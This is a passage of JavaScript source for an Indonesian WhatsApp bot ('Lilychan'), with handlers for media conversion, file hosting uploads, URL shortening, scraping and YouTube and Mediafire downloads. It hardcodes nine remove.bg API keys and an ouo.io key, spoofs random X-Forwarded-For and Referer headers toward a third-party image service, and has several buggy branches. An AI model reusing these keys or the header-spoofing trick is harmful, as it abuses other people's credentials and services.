    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video');
    let buffer = Buffer.from([]);

    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk]);
    }

    if (/video/.test(type)) {
        return lilychan.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m);
    } else if (/image/.test(type)) {
        return lilychan.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m);
    }
}
break
case 'toimage':
case 'toimg': {
    if (!/webp/.test(mime)) return m.reply(`Reply sticker with caption *${prefix + command}*`);
    m.reply(mess.wait);
    
    let media = await lilychan.downloadAndSaveMediaMessage(qmsg);
    let ran = await getRandom('.png');
    
    exec(`ffmpeg -i ${media} ${ran}`, (err) => {
        fs.unlinkSync(media);
        if (err) return err;
        
        let buffer = fs.readFileSync(ran);
        lilychan.sendMessage(m.chat, {
            image: buffer
        }, {
            quoted: m
        });
        
        fs.unlinkSync(ran);
    });
}
break

case 'tomp4':
case 'tovideo': {
    if (!/webp/.test(mime)) return m.reply(`Reply sticker with caption *${prefix + command}*`);
    m.reply(mess.wait);
    
    let { webp2mp4 } = require('./lib/webp2mp4');
    let { ffmpeg } = require('./lib/converter'); 
    let media = await quoted.download();
    
    lilychan.sendMessage(m.chat, {
        react: {
            text: '🕒',
            key: m.key,
        }
    });
    
    let out = Buffer.alloc(0);
    if (/webp/.test(mime)) {
        out = await webp2mp4(media);
    } else if (/audio/.test(mime)) {
        out = await ffmpeg(media, [
            '-filter_complex', 'color',
            '-pix_fmt', 'yuv420p',
            '-crf', '51',
            '-c:a', 'copy',
            '-shortest'
        ], 'mp3', 'mp4');
    }
    
    await lilychan.sendMessage(m.chat, {
        video: { url: out },
        gifPlayback: false, 
        caption: 'Donee Desuu~'
    }, { quoted: m });
}
break

case 'toaud':
case 'tomp3': 
case 'toaudio': {
    if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply(`Send/Reply Video/Audio that you want to make into audio with caption ${prefix + command}`);
    m.reply(mess.wait);
    
    let media = await lilychan.downloadMediaMessage(qmsg);
    let audio = await toAudio(media, 'mp4');
    await sleep(3000);
    
    lilychan.sendMessage(m.chat, {
        audio: await quoted.download(),
        mimetype: 'audio/mpeg'
    }, {
        quoted: m
    });
}
break

case 'tovn':
case 'toptt': {
    if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply(`Reply Video/Audio that you want to make into a VN with caption ${prefix + command}`);
    m.reply(mess.wait);
    
    let media = await lilychan.downloadMediaMessage(qmsg);
    let { toPTT } = require('./lib/converter');
    await sleep(3000);
    
    let audio = await toPTT(media, 'mp4');
    lilychan.sendMessage(m.chat, {
        audio: await quoted.download(),
        mimetype: 'audio/mpeg',
        ptt: true
    }, {
        quoted: m
    });
}
break

case 'togif': {
    if (!/webp/.test(mime)) return m.reply(`Reply sticker with caption *${prefix + command}*`);
    m.reply(mess.wait);
    
    let { webp2mp4 } = require('./lib/webp2mp4');
    let { ffmpeg } = require('./lib/converter'); 
    let media = await quoted.download();
    
    lilychan.sendMessage(m.chat, {
        react: {
            text: '🕒',
            key: m.key,
        }
    });
    
    let out = Buffer.alloc(0);
    if (/webp/.test(mime)) {
        out = await webp2mp4(media);
    } else if (/audio/.test(mime)) {
        out = await ffmpeg(media, [
            '-filter_complex', 'color',
            '-pix_fmt', 'yuv420p',
            '-crf', '51',
            '-c:a', 'copy',
            '-shortest'
        ], 'mp3', 'mp4');
    }
    
    await lilychan.sendMessage(m.chat, {
        video: { url: out },
        gifPlayback: true, 
        caption: 'Donee Desuu~'
    }, { quoted: m });
}
break
case 'toptv': {
    if (/video/.test(qmsg.mimetype)) {
        if ((qmsg).seconds > 30) return m.reply("Durasi vidio maksimal 30 detik!");
        
        let ptv = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({ ptvMessage: qmsg }), { userJid: m.chat, quoted: m });
        lilychan.relayMessage(m.chat, ptv.message, { messageId: ptv.key.id });
    } else { 
        if (!/webp/.test(mime)) return m.reply(`Reply sticker/video with caption *${prefix + command}*`);
        
        m.reply(mess.wait);
        
        let { webp2mp4 } = require('./lib/webp2mp4');
        let { ffmpeg } = require('./lib/converter'); 
        let media = await quoted.download();
        let out = Buffer.alloc(0);
        
        if (/webp/.test(mime)) {
            out = await webp2mp4(media);
        }
        
        let msg = await generateWAMessageContent({
            video: { url: out }
        }, {
            upload: lilychan.waUploadToServer
        });
        
        let ptv = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({ ptvMessage: msg.videoMessage }), { userJid: m.chat, quoted: m });
        lilychan.relayMessage(m.chat, ptv.message, { messageId: ptv.key.id });
    }
}
break

case 'ptvtovid': {
    try {
        // Mengunduh dan menyimpan media dari pesan
        let media = await lilychan.downloadAndSaveMediaMessage(qmsg);

        // Mengecek apakah tipe media adalah gambar, video, atau audio
        if (/image/.test(mime) || /video/.test(mime) || /audio/.test(mime)) {
            let { UploadFileUgu, tmpfiles, TelegraPh } = require('./lib/uploader');
            let url = await uploadToUguu(media);
            await lilychan.sendMessage(m.chat, {
                video: { url: `${url}` },
                gifPlayback: false, 
                caption: 'Donee Desuu~'
            }, { quoted: m });
        } else {
            m.reply(`Terjadi Kesalahan`);
        }

        // Menghapus file setelah diunggah
        fs.unlinkSync(media);
    } catch (err) {
        console.log(err);
    }
}
break

case 'style':
case 'styletext': {
    async function styletext(teks) {
        return new Promise((resolve, reject) => {
            axios.get('http://qaz.wtf/u/convert.cgi?text=' + teks)
            .then(({ data }) => {
                let $ = cheerio.load(data);
                let hasil = [];
                $('table > tbody > tr').each(function (a, b) {
                    hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() });
                });
                resolve(hasil);
            });
        });
    }

    if (!text) return m.reply('Enter Query text!');
    
    let anu = await styletext(text);
    let teks = `Style Text From ${text}\n\n`;
    
    for (let i of anu) {
        teks += `🍀 *${i.name}* : ${i.result}\n\n`;
    }
    
    m.reply(teks);
}
break
case 'top4top': {
if (!isPremium) return m.reply(mess.prem)
  const request = require("request")
const { fromBuffer } = require('file-type');
async function top4top(baper) {
	return new Promise(async (resolve, reject) => {
		const {
			ext
		} = await fromBuffer(baper) || {}
		var req = await request({
				url: "https://top4top.io/index.php",
				method: "POST",
				"headers": {
					"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
					"accept-language": "en-US,en;q=0.9,id;q=0.8",
					"cache-control": "max-age=0",
					'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryAmIhdMyLOrbDawcA',
					'User-Agent': 'Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.585 Mobile Safari/534.11+'
				}
			},
			function(error, response, body) {
				if (error) { return resolve({
					result: 'error'
				}) }
				const $ = cheerio.load(body)
				let result = $('div.alert.alert-warning > ul > li > span').find('a').attr('href') || "gagal"
				if (result == "gagal") {
					resolve({
						status: "error",
						msg: "maybe file not allowed or try another file"
					})
				}
				resolve({
					status: "sukses",
					result
				})
			});
		let form = req.form()
		form.append('file_1_', baper, {
			filename: `${Math.floor(Math.random() * 10000)}.` + `${ext}`
		})
		form.append('file_1_', '')
		form.append('submitr', '[ رفع الملفات ]')
	})
}
let spas = "                "
    let q = m.quoted ? m.quoted : m
  let mime = (q.msg || q).mimetype || ''
  if (!/image/g.test(mime)) throw "Reply Gambar Aja"
  let media = await q.download()
  let link = await top4top(media)
  let { result, status } = link
  let caption = `*[ ${status.toUpperCase()} ]*

📮 *L I N K :*
${result}
📊 *S I Z E :* ${media.length} Byte
`

m.reply(caption)
}
break
case 'tourl': {
    if (!/video/.test(mime) && !/image/.test(mime)) {
        return m.reply(`*🚩 Send/Reply the Video/Image With Caption* ${prefix + command}`);
    }

    lilychan.sendMessage(m.chat, { react: { text: '🕐', key: m.key } });

    let { UploadFileUgu, tmpfiles, TelegraPh } = require('./lib/uploader');
    let media = await lilychan.downloadAndSaveMediaMessage(quoted);

    if (/image/.test(mime) || /video/.test(mime) || /audio/.test(mime)) {
        let anu = await uploadToUguu(media);
        let loli = `${util.format(anu)}
${media.length} Byte(s)
(Tidak Ada Tanggal Kedaluwarsa)`;
        m.reply(loli);
    } else if (!/image/.test(mime)) {
        let anu = await uploadToUguu(media);
        m.reply(loli);
    }

    await fs.unlinkSync(media);
}
break

case 'tourl2': {
    if (!isPremium) return m.reply(mess.prem);

    const axios = require('axios');
    const FormData = require('form-data');
    const fs = require('fs');
    m.reply(mess.wait); // Mengirim pesan 'wait' sementara proses berlangsung

    // Fungsi untuk mengunggah file ke Catbox
    async function uploadToCatbox(filePath) {
        try {
            if (!fs.existsSync(filePath)) {
                throw new Error("File not found");
            }

            const form = new FormData();
            form.append('reqtype', 'fileupload');
            form.append('fileToUpload', fs.createReadStream(filePath));

            const response = await axios.post('https://catbox.moe/user/api.php', form, {
                headers: {
                    ...form.getHeaders()
                }
            });

            if (response.status === 200 && response.data) {
                return response.data.trim(); // Mengembalikan URL file yang diunggah
            } else {
                throw new Error(`Upload failed with status: ${response.status}`);
            }
        } catch (err) {
            throw new Error(`Upload failed: ${err.message}`);
        }
    }

    try {
        // Mengunduh dan menyimpan media dari pesan
        let media = await lilychan.downloadAndSaveMediaMessage(qmsg);

        // Mengecek apakah tipe media adalah gambar, video, atau audio
        if (/image/.test(mime) || /video/.test(mime) || /audio/.test(mime)) {
            let url = await uploadToCatbox(media);
            m.reply(`${url}`);
        } else {
            m.reply(`Maaf, hanya gambar, video, atau audio yang dapat diunggah.`);
        }

        // Menghapus file setelah diunggah
        await fs.unlinkSync(media);
    } catch (err) {
        m.reply(`Error: ${err.message}`);
    }
}
break
case 'tourl3': {
    if (!isPremium) return m.reply(mess.prem);
    m.reply(mess.wait); // Mengirim pesan 'wait' sementara proses berlangsung

    async function Nekohime(filePath) {
        try {
            const formData = new FormData();
            formData.append('file', fs.createReadStream(filePath));
            const response = await axios.post('https://cdn.nekohime.xyz/upload', formData, {
                headers: {
                    ...formData.getHeaders(),
                },
            });

            return response.data.files; // Mengembalikan URL file yang diunggah
        } catch (error) {
            throw new Error(`Gagal mengunggah file ke CDN: ${error.message}`);
        }
    }

    try {
        // Mengunduh dan menyimpan media dari pesan
        let media = await lilychan.downloadAndSaveMediaMessage(qmsg);

        // Mengecek apakah tipe media adalah gambar, video, atau audio
        if (/image/.test(mime) || /video/.test(mime) || /audio/.test(mime)) {
            let url = await Nekohime(media);
            m.reply(`${url}`);
        } else {
            m.reply(`Maaf, hanya gambar, video, atau audio yang dapat diunggah.`);
        }
    } catch (err) {
        m.reply(`Error: ${err.message}`);
    }
}
break
case 'freeimage': {
    if (!isPremium) return m.reply(mess.prem);
    
    const axios = require('axios');
    const FormData = require('form-data');
    const fs = require('fs');

    m.reply(mess.wait);

    try {
        const media = await lilychan.downloadAndSaveMediaMessage(qmsg);
        const buffer = fs.readFileSync(media);

        const { data: html } = await axios.get("https://freeimage.host/");
        const token = html.match(/PF.obj.config.auth_token = "(.+?)";/)[1];

        const form = new FormData();
        form.append("source", buffer, 'file.jpg');
        form.append("type", "file");
        form.append("action", "upload");
        form.append("timestamp", Math.floor(Date.now() / 1000));
        form.append("auth_token", token);
        form.append("nsfw", "0");

        const { data } = await axios.post("https://freeimage.host/json", form, {
            headers: { "Content-Type": "multipart/form-data", ...form.getHeaders() },
        });

        m.reply(data.image.url);
        fs.unlinkSync(media);
    } catch (error) {
        m.reply(`Error: ${error.message}`);
    }
}
break


case 'getpp': {
    if (!m.isGroup) return m.reply(`_${mess.group}_`);
    
    if (m.quoted || q) {
        let pporang = await lilychan.profilePictureUrl(froms, 'image').catch(_ => m.reply('Profile di private!'));
        if (pporang) return lilychan.sendMessage(m.chat, { image: { url: pporang }, caption: 'Nih!' }, { quoted: m });
    } else {
        m.reply('Tag atau reply pesan target!');
    }
}
break


case 'ssweb':
case 'ss': {
    if (!text) return m.reply(`Example: ${prefix + command} https://xxxxxxxxxxxxx`);
    
    try {
        let buf;
        if (!text.startsWith('http')) {
            buf = 'https://image.thum.io/get/width/1900/crop/1000/fullpage/https://' + q;
        } else {
            buf = 'https://image.thum.io/get/width/1900/crop/1000/fullpage/' + q;
        }
        await lilychan.sendMessage(m.chat, { image: { url: buf }, caption: 'Done' }, { quoted: m });
    } catch (e) {
        m.reply('Server SS web Sedang Offline!');
    }
}
break

case 'wikipedia': {
    if (!text) return m.reply(`Mohon masukkan kata kunci topik yang ingin Anda cari informasinya.\n\nContoh: Wikipedia Teknologi Informasi`);

    m.reply('Mencari artikel Wikipedia...');

    try {
        const url = `https://id.wikipedia.org/wiki/${encodeURIComponent(text)}`;
        const response = await axios.get(url);
        const $ = cheerio.load(response.data);

        const judul = $('#firstHeading').text().trim();
        const konten = $('#mw-content-text > div.mw-parser-output').find('p').map((i, el) => $(el).text().trim()).get().join('\n\n');

        if (!konten) {
            throw new Error('Tidak ada artikel yang ditemukan untuk kata kunci tersebut.');
        }

        const artikel = `Judul: ${judul}\n\n${konten}`;
        m.reply(artikel);
    } catch (error) {
        m.reply(`Maaf, terjadi kesalahan: ${error.message}`);
    }
}
break
case 'rangkum': {
   if (!q) return m.reply(`Masukkan kalimat Yang Mau di rangkum`);
  const sentences = `${q}`.match(/[^.!?]+[.!?]/g) || [];
  const wordFrequency = {};
  sentences.forEach(sentence => {
    const words = sentence.toLowerCase().split(/\s+/);
    words.forEach(word => {
      word = word.replace(/[.,!?]/g, '');
      if (word.length > 0) {
        if (wordFrequency[word]) {
          wordFrequency[word]++;
        } else {
          wordFrequency[word] = 1;
        }
      }
    });
  });
  const sortedWords = Object.keys(wordFrequency).sort((a, b) => wordFrequency[b] - wordFrequency[a]);
  const summarySentences = sentences
    .filter(sentence => {
      const words = sentence.toLowerCase().split(/\s+/).map(word => word.replace(/[.,!?]/g, ''));
      return words.some(word => sortedWords.includes(word));
    })
    .slice(0, 3);
  const summary = summarySentences.join(' ');
  m.reply(summary || "Gagal merangkum teks.");
}
break
case 'wikimedia': {
    try {
        async function wikimedia(title) {
            return new Promise(async (resolve, reject) => {
                axios.get(`https://commons.wikimedia.org/w/index.php?search=${title}&title=Special:MediaSearch&go=Go&type=image`)
                    .then(({ data }) => {
                        let $ = cheerio.load(data);
                        let hasil = [];
                        $('.sdms-search-results__list-wrapper > div > a').each(function (a, b) {
                            hasil.push({
                                title: $(b).find('img').attr('alt'),
                                source: $(b).attr('href'),
                                image: $(b).find('img').attr('data-src') || $(b).find('img').attr('src')
                            });
                        });
                        resolve(hasil);
                    });
            });
        }

        if (!text) return m.reply('```🚩 Input Query```');
        m.reply('wait a minute...');
        let yapit = await wikimedia(text);
        await lilychan.sendFile(m.chat, yapit[0].image, null, `${yapit[0].title}`, m);
    } catch (e) {
        m.reply('Tidak Ada Hasil.');
    }
}
break

case 'nobg':
case 'removebg':
case 'remove-bg': {
    if (!isPremium) return m.reply(mess.prem);
    if (!/image/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`);
    if (/webp/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`);

    let remobg = require('remove.bg');
    let apirnobg = [
        'q61faXzzR5zNU6cvcrwtUkRU',
        'S258diZhcuFJooAtHTaPEn4T',
        '5LjfCVAp4vVNYiTjq9mXJWHF',
        'aT7ibfUsGSwFyjaPZ9eoJc61',
        'BY63t7Vx2tS68YZFY6AJ4HHF',
        '5Gdq1sSWSeyZzPMHqz7ENfi8',
        '86h6d6u4AXrst4BVMD9dzdGZ',
        'xp8pSDavAgfE5XScqXo9UKHF',
        'dWbCoCb3TacCP93imNEcPxcL'
    ];
    
    let apinobg = apirnobg[Math.floor(Math.random() * apirnobg.length)];
    let hmm = './remobg-' + getRandom('');
    let localFile = await lilychan.downloadAndSaveMediaMessage(qmsg, hmm);
    let outputFile = './hremo-' + getRandom('.png');
    
    m.reply(mess.wait);
    
    remobg.removeBackgroundFromImageFile({
        path: localFile,
        apiKey: apinobg,
        size: "regular",
        type: "auto",
        scale: "100%",
        outputFile
    }).then(async result => {
        lilychan.sendMessage(m.chat, { image: fs.readFileSync(outputFile), caption: 'Done Desuu~' }, { quoted: m });
        await fs.unlinkSync(localFile);
        await fs.unlinkSync(outputFile);
    });
}
break

case 'tinyurl': { 
    if (!text) return m.reply(`Example : ${prefix + command} URL`);
    
    const longUrl = args[0];
    axios.get(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(text)}`)
        .then(response => {
            const shortUrl = response.data;
            m.reply(`URL : ${shortUrl}`);
        })
        .catch(error => {
            console.error(error);
            m.reply('An error occurred when creating short link.');
        });
}
break

case 'ouo': {
    async function ouo(url) {
        try {
            const sensei = await fetch(`http://ouo.io/api/KzDtJCvY?s=${url}`);
            const result = await sensei.text();
            return result;
        } catch (error) {
            console.error(error);
            return null;
        }
    }

    if (!text) return m.reply(`Example : ${prefix + command} URL`);
    
    let longUrl = args[0];
    let result = await ouo(longUrl);
    m.reply(result);
}
break

case 'cleanurl':{
    async function cleanuri(url) {
        try {
            const response = await fetch("https://cleanuri.com/api/v1/shorten", {
                method: "POST",
                body: new URLSearchParams({
                    url: url,
                }),
            });
            const result = await response.json();
            return result.result_url;
        } catch (error) {
            console.error(error);
            return null;
        }
    }
  if (!text) return m.reply(`Example : ${prefix + command} URL`)
     let longUrl = args[0];
     let result = await cleanuri(longUrl)
  m.reply(result)
 }
 break
 case 'readmore': {
	let [l, r] = text.split`|`
    if (!l) l = ''
    if (!r) r = ''
    lilychan.sendMessage(m.chat, {text: l + readmore + r}, {quoted: m})
}
break
case 'vurl': {
 if (!text) return m.reply(`Example : ${prefix + command} URL`)
    const longUrl = encodeURIComponent(text);

    axios.get(`https://vurl.com/api.php?url=${longUrl}`)
    .then(response => {
        const shortUrl = response.data.trim();
        m.reply(`${shortUrl}`);
    })
    .catch(error => {
        console.error(error);
        m.reply('Terjadi kesalahan saat memendekkan URL.');
    });
}
break
case 'repeat':{
let a = `${q}`
m.reply(a.repeat(10))
}
break
//<================================================>//
/*
 
 
                    [ SCRIPT LILY ]
    I share this script for free without spending any money, and I forbid anyone from selling this script. please report to Tanaka Senn if anyone is caught selling script Lilychanj 
                   < CONVERT FITUR >

*/
//<================================================>//
case 'bass':
case 'blown':
case 'deep':
case 'earrape':
case 'fast':
case 'fat':
case 'nightcore':
case 'reverse':
case 'robot':
case 'slow':
case 'smooth':
case 'tupai': {
    if (!qmsg) return m.reply("reply audio nya");
    
    try {
        let set;
        if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20';
        if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log';
        if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3';
        if (/earrape/.test(command)) set = '-af volume=12';
        if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"';
        if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"';
        if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25';
        if (/reverse/.test(command)) set = '-filter_complex "areverse"';
        if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"';
        if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"';
        if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"';
        if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"';
        
        if (/audio/.test(mime)) {
            let media = await lilychan.downloadAndSaveMediaMessage(qmsg);
            let ran = pickRandom('.mp3');
            exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media);
                if (err) return m.reply(err);
                let buff = fs.readFileSync(ran);
                lilychan.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted: m });
                fs.unlinkSync(ran);
            });
        } else {
            m.reply(`Reply to the audio you want to change with a caption *${prefix + command}*`);
        }
    } catch (e) {
        console.log(e);
        m.reply('error');
    }
}
break

case 'toanime':
case 'jadianime': {
    if (!isPremium) return m.reply(mess.prem);
    
    var q = m.quoted ? m.quoted : m;
    var mimes = (q.msg || q).mimetype || q.mediaType || '';
    
    if (/image/g.test(mimes) && !/webp/g.test(mimes)) {
        try {
            await lilychan.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
            const img = await q.download();
            let out = await uploadToUguu(img);
            let convert = await fetchJson(`https://api.betabotz.eu.org/api/maker/jadianime?url=${out}&apikey=${btz}`);
            let buff = await getBuffer(convert.result.img_crop_single);
            await lilychan.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
            await lilychan.sendMessage(m.chat, { image: buff, caption: '```Success...\nDont forget to donate```' }, { quoted: m });
        } catch (e) {
            console.log(e);
            m.reply(`[ ! ] Identifikasi Gagal.`);
        }
    } else {
        m.reply(`Kirim gambar dengan caption *${prefix + command}* atau tag gambar yang sudah dikirim`);
    }
}
break

case 'tozombie':
case 'jadizombie': {
    var q = m.quoted ? m.quoted : m;
    var mimes = (q.msg || q).mimetype || q.mediaType || '';
    
    if (/image/g.test(mimes) && !/webp/g.test(mimes)) {
        try {
            await lilychan.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
            const img = await q.download();
            let out = await uploadToUguu(img);
            let convert = await fetchJson(`https://api.betabotz.eu.org/api/maker/jadizombie?url=${out}&apikey=${btz}`);
            let buff = await getBuffer(convert.result);
            await lilychan.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
            await lilychan.sendMessage(m.chat, { image: buff, caption: '``Success...\nDont forget to donate```' }, { quoted: m });
        } catch (e) {
            console.log(e);
            m.reply(`[ ! ] Identifikasi Gagal.`);
        }
    } else {
        m.reply(`Kirim gambar dengan caption *${prefix + command}* atau tag gambar yang sudah dikirim`);
    }
}
break
        
case 'togta':
case 'jadigta': {
    var q = m.quoted ? m.quoted : m;
    var mimes = (q.msg || q).mimetype || q.mediaType || '';
    
    if (/image/g.test(mimes) && !/webp/g.test(mimes)) {
        try {
            await lilychan.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
            const img = await q.download();
            let out = await uploadToUguu(img);
            let convert = await fetchJson(`https://api.betabotz.eu.org/api/maker/jadigta?url=${out}&apikey=${btz}`);
            let buff = await getBuffer(convert.result);
            await lilychan.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
            await lilychan.sendMessage(m.chat, { image: buff, caption: '``Success...\nDont forget to donate```' }, { quoted: m });
        } catch (e) {
            console.log(e);
            m.reply(`[ ! ] Identifikasi Gagal.`);
        }
    } else {
        m.reply(`Kirim gambar dengan caption *${prefix + command}* atau tag gambar yang sudah dikirim`);
    }
}
break

case 'text2img': {
    if (!isPremium) return m.reply(mess.prem);
    if (!text) return m.reply(`*Example*:\n ${prefix + command} woman,sexy`);
    
    m.reply(mess.wait);
    const hasil = await getBuffer(`https://api.betabotz.eu.org/api/maker/text2img?text=${text}&apikey=${btz}`);
    lilychan.sendMessage(m.chat, { image: hasil, caption: `*Prompt* : ${text}\n` }, { quoted: m });
}
break

case 'imagetoprompt':
case 'toprompt': {
const axios = require("axios");

async function describe(url, prompt = "") {
  return new Promise(async (resolve, reject) => {
    try {
      const { data: response } = await axios.post(
        "https://pallyy.com/api/tools/image-to-description/get",
        {
          imageUrl: url,
          prompt: prompt,
        },
        {
          headers: {
            "Content-Type": "application/json",
            Referer: "https://imagedescriber.online/",
            Origin: "https://imagedescriber.online",
            "User-Agent": "Postify/1.0.0",
            "X-Forwarded-For": Array(4)
              .fill(0)
              .map(() => Math.floor(Math.random() * 256))
              .join("."),
          },
        }
      );

      resolve({ status: true, desc: response.description });
    } catch (error) {
      console.log("Rusak bro");
      reject({ status: false, message: error.message });
    }
  });
 }

 if (!isPremium) return m.reply(mess.prem);
  if (!/image/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`);
    
    m.reply(mess.wait);
    const img = await lilychan.downloadAndSaveMediaMessage(quoted);
    let out = await uploadToUguu(img);
    const hasil = await describe(out);
    lilychan.sendMessage(m.chat, { text: `*Prompt* : ${hasil.desc}\n` }, { quoted: m });
}
break

case 'picsum': {
  if (!q) return m.reply(`contoh \n\npicsum nature`);
  if (!isPremium) return m.reply(mess.prem)  
  async function picSumAvz(text) {
    try {
      const imageUrl = `https://picsum.photos/seed/${q}/800/600`;
      return imageUrl;
    } catch (err) {
      return null;
    }
  }
//avs
  const result = await picSumAvz(q);
  if (result) {
    const message = {
      image: { url: result },
      caption: `hasil dari pencarian gambar : ${q}`
    };
    lilychan.sendMessage(m.chat, message);
  } else {
    m.reply('err.');
  }
}
break 

case 'robomaker': { 
 if (!q) return m.reply(`contoh \nRobomaker Lilychanj\n\n! Ini Bukan Membuat Robot Tapi menghasilkan robot dari nama doang`);
  async function roboMaker(text) {
    try {
      const imageUrl = `https://robohash.org/${q}`;
      return imageUrl;
    } catch (err) {
      return null;
    }
  }
  const result = await roboMaker(q);
  if (result) {
    const message = {
      image: { url: result },
      caption: 'Random Robot'
    };
    lilychan.sendMessage(m.chat, message);
  } else {
    m.reply('err.');
  }
}
break 
 //<================================================>//
/*
 
 
                    [ SCRIPT LILY ]
    I share this script for free without spending any money, and I forbid anyone from selling this script. please report to Tanaka Senn if anyone is caught selling script Anya Forger 
                   < DOWNLOADER FITUR >

*/
//<================================================>//
case 'git':
case 'gitclone': {
    if (!args[0]) {
        return m.reply(`Example: ${prefix + command} https://github.com/xxxxxxx`);
    }

    if (!args[0].includes('github.com')) {
        return m.reply('Gunakan Url Github!');
    }

    let [, user, repo] = args[0].match(/(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i) || [];

    try {
        await lilychan.sendMessage(m.chat, {
            document: { url: `https://api.github.com/repos/${user}/${repo}/zipball` },
            fileName: repo + '.zip',
            mimetype: 'application/zip'
        }, { quoted: qchanel });
    } catch (e) {
        m.reply('Gagal!');
    }
}
break;
case 'mediafire': {
    async function mediafiredll(url) {
        const res = await axios.get(`https://www-mediafire-com.translate.goog/${url.replace('https://www.mediafire.com/', '')}?_x_tr_sl=en&_x_tr_tl=fr&_x_tr_hl=en&_x_tr_pto=wapp`);
        const $ = cheerio.load(res.data);
        
        const fileurl = $('#downloadButton').attr('href');
        const filename = $('body > main > div.content > div.center > div > div.dl-btn-cont > div.dl-btn-labelWrap > div.promoDownloadName.notranslate > div')
            .attr('title')
            .replaceAll(' ', '')
            .replaceAll('\n', '');
        
        const date = $('body > main > div.content > div.center > div > div.dl-info > ul > li:nth-child(2) > span').text();
        const filesize = $('#downloadButton').text()
            .replace('Download', '')
            .replace('(', '')
            .replace(')', '')
            .replace('\n', '')
            .replace('\n', '')
            .replace('                         ', '')
            .replaceAll(' ', '');
        
        let filetype = '';
        let rese = await axios.head(link);
        filetype = rese.headers['content-type'];

        return { filename, filesize, date, filetype, fileurl };
    }

    let input = `*Example*: ${prefix + command} https://www.mediafire.com/file/pwxob70rpgma9lz/GBWhatsApp_v8.75%2528Tutorial_Yud%2529.apk/file*`;
    
    if (!text) return m.reply(input);
    
    const dataJson = await mediafiredll(text);
    const { filename, filesize, date, filetype, fileurl } = dataJson
    if (filesize.split('MB')[0] >= 100) {
        return m.reply('*Ih gede banget size nya, gak mao ah😠*');
    }

    await sleep(500);
    
    const caption = `≡ *MEDIAFIRE*

▢ *Name* : ${filename}
▢ *Size* : ${filesize}
▢ *Type* : ${filetype}
▢ *UploadAt*: ${date}`;

     lilychan.sendMessage(m.chat, { document : { url : fileurl}, fileName : filename, caption: caption, mimetype: filetype }, { quoted : ftroli });
}
break;
case 'play': {
    if (!text) {
        return m.reply(`Example: ${prefix}play beautiful in white`);
    }

    let wait = await lilychan.sendMessage(m.chat, {
        text: `_Searching.. [ ${text} ] 🔍_`
    }, {
        quoted: m,
        ephemeralExpiration: 86400
    });

    try {
        let search = await yts(text);
        let videos = search.all.filter(v => v.type === 'video');

        if (!videos.length) {
            await m.reply('No videos found for your query.', { quoted: m });
            return;
        }

        let video = videos[0];
        let data = await ytdl(`${video.url}`);
        let sennn = `\`\`\`Successfully Get Music Data\n\n` +
                    `Title : ${search.all[0].title}\n` +
                    `Views : ${search.all[0].views}\n` +
                    `Duration : ${search.all[0].timestamp}\n` +
                    `Uploaded : ${search.all[0].ago}\n` +
                    `\`\`\``;

        let tanakasen = await lilychan.sendMessage(m.chat, {
            text: sennn,
            edit: wait.key
        }, {
            quoted: m,
            ephemeralExpiration: 86400
        });

        await lilychan.sendMessage(m.chat, {
            audio: { url: data.audio },
            mimetype: "audio/mpeg",
            ptt: false
        }, {
            quoted: tanakasen
        });
    } catch (e) {
        console.log(e);
        m.reply("emlol");
    }
}
break;
case 'playvid':
case 'play2': {
    if (!text) {
        return m.reply(`Example: ${prefix}play beautiful in white`);
    }

    try {
        let search = await yts(text);
        let videos = search.all.filter(v => v.type === 'video');

        if (!videos.length) {
            await m.reply('No videos found for your query.', { quoted: m });
            return;
        }

        let video = videos[0];
        let data = await ytdl(`${video.url}`);
        let captions = `\`\`\`Successfully Get Video Data\n\n` +
                       `Title : ${search.all[0].title}\n` +
                       `Views : ${search.all[0].views}\n` +
                       `Duration : ${search.all[0].timestamp}\n` +
                       `Uploaded : ${search.all[0].ago}\n` +
                       `\`\`\``;

        await lilychan.sendMessage(m.chat, { 
            video: { url: data.url }, 
            caption: captions 
        }, { quoted: m });
    } catch (error) {
        console.error('Error:', error);
        if (error.statusCode === 403) {
            await m.reply('Download Gagal.');
        } else {
            await m.reply('Error.');
        }
    }
}
break;
case 'gdrive': {
    if (!text) {
